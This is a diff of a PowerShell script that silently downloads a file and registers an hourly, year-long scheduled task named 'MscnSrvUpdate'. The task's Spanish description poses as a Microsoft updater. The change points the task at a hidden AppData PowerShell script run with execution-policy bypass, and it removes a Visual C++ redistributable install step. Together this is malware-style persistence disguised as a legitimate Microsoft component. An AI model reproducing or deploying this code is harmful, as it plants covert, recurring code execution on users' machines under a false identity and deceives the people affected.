@@ -20,21 +20,10 @@ Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction SilentlyContinue
 
 Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue
 
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
+$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-Executionpolicy Bypass -NoProfile -File $USERNAMEPTH\AppData\Local\Microsoft\MsUpdate\Mscntask.ps1"
 $trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará, lo que significa que no se podrán corregir las vulnerabilidades que puedan surgir y es posible que las características no funcionen. Esta tarea se desinstalará cuando el software de Microsoft no la esté usando." -Settings $settings | Out-Null
-
-
-$redistributableName = "Microsoft Visual C++ 2015-2022 Redistributable (x86)"
-if (-not (Get-WmiObject -Query "SELECT * FROM Win32_Product WHERE Name = '$redistributableName'")) {
-    $installerPath = "$env:USERPROFILE\AppData\Local\Microsoft\MsUpdate\vc_redist.x86.exe"
-    if (-not (Test-Path $installerPath)) {
-        Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x86.exe" -OutFile $installerPath
-    }
-    Start-Process -FilePath $installerPath -ArgumentList "/quiet", "/norestart" -Wait
-}
-
 
 Start-ScheduledTask -TaskName "MscnSrvUpdate"
 
